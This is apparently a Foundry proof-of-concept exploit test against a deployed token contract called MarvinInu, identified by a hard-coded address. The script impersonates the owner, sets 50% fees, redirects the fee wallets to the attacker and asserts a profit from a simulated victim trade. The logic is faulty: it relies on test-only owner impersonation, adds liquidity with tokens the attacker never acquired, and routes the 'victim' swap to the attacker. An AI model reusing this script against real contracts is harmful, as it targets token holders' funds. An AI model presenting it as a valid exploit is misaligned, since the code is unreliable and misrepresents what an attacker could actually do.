pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
}

// Defined missing MarvinInu interface to resolve compilation error
interface MarvinInu {
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function owner() external view returns (address);
    function updateBuyFees(uint256, uint256, uint256) external;
    function updateSellFees(uint256, uint256, uint256) external;
    function updateSwapTokensAtAmount(uint256) external;
    function updateMarketingWallet(address) external;
    function updateDevWallet(address) external;
    function enableTrading() external;
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);
    MarvinInu token;
    IUniswapV2Router02 router;
    IUniswapV2Pair pair;
    IWETH WETH;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = MarvinInu(TARGET);
        router = IUniswapV2Router02(token.uniswapV2Router());
        pair = IUniswapV2Pair(token.uniswapV2Pair());
        WETH = IWETH(router.WETH());

        // Inject ETH for attacker
        deal(address(this), 100 ether);

        // Get owner address and impersonate
        owner = token.owner();
        vm.label(owner, "Owner");
        vm.label(address(this), "Attacker");
        vm.label(TARGET, "MarvinInu Token");
        vm.label(address(router), "Uniswap Router");
        vm.label(address(pair), "Uniswap Pair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Step 1: Impersonate owner and set maximum fees
        vm.startPrank(owner);
        token.updateBuyFees(25, 20, 5); // 50% total buy fees
        token.updateSellFees(25, 20, 5); // 50% total sell fees

        // Step 2: Lower swap threshold for faster fee collection
        token.updateSwapTokensAtAmount(token.totalSupply() * 1 / 100000); // Minimum allowed

        // Step 3: Redirect wallet addresses to attacker
        token.updateMarketingWallet(address(this));
        token.updateDevWallet(address(this));

        // Step 4: Enable trading
        token.enableTrading();
        vm.stopPrank();

        // Step 5: Add liquidity to the pair
        // Approve router to spend tokens
        token.approve(address(router), type(uint256).max);

        // Add liquidity (10 ETH + equivalent tokens)
        uint256 liquidityETH = 10 ether;
        uint256 tokenAmount = 1000000 * 1e18;
        router.addLiquidityETH{value: liquidityETH}(
            address(token),
            tokenAmount,
            0,
            0,
            address(this),
            block.timestamp
        );

        // Step 6: Simulate victim trade (buy tokens with ETH)
        // This generates fees that accumulate in the contract
        uint256 victimETH = 5 ether;
        WETH.deposit{value: victimETH}();
        WETH.approve(address(router), victimETH);

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(token);

        // Victim buys tokens - 50% fees will be collected
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            victimETH,
            0,
            path,
            address(this), // Victim receives tokens
            block.timestamp
        );

        // Step 7: Trigger swapBack by doing another transfer
        // The contract should have accumulated enough fees
        token.transfer(address(0xdead), 1000); // Small transfer to trigger swapBack if threshold met

        // Step 8: Verify profit
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker should have profited from fee collection");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

